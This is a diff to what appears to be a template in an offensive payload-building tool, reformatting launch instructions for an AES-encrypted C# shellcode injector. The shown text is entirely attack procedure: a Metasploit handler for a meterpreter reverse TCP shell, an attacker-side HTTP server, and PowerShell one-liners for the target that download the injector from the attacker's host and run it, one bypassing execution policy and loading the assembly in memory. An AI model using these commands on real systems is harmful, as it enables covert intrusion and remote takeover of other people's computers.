@@ -120,20 +120,37 @@ output:
     command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
 
   launch_instructions: |
-    C# AES Shellcode Injector - Launch Instructions
+    # Start Listener
 
-    Start Listener:
-    $ msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set EXITFUNC thread; set ExitOnSession false; exploit -j"
+    ```bash
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set EXITFUNC thread; set ExitOnSession false; exploit -j"
+    ```
 
-    Transfer and Execute:
-    $ python3 -m http.server 80
-    $ powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }} {{ target_process }}"
+    # Transfer and Execute
 
-    In-Memory Execution (C# Binary):
-    $ python3 -m http.server 80
-    $ powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [AESInjector.Program]::Main(@('{{ target_process }}'))"
+    **Attacker:**
+    ```bash
+    python3 -m http.server 80
+    ```
+    
+    **Target:**
+    ```powershell
+    powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }} {{ target_process }}"
+    ```
 
-    Notes:
+    # In-Memory Execution (C# Binary)
+
+    **Attacker:**
+    ```bash
+    python3 -m http.server 80
+    ```
+    
+    **Target:**
+    ```powershell
+    powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [AESInjector.Program]::Main(@('{{ target_process }}'))"
+    ```
+
+    # Notes
     - Target process: {{ target_process }} (must be running on target)
     - Shellcode encrypted with AES-256-CBC (key and IV embedded in binary)
     - Decryption occurs in-memory before injection
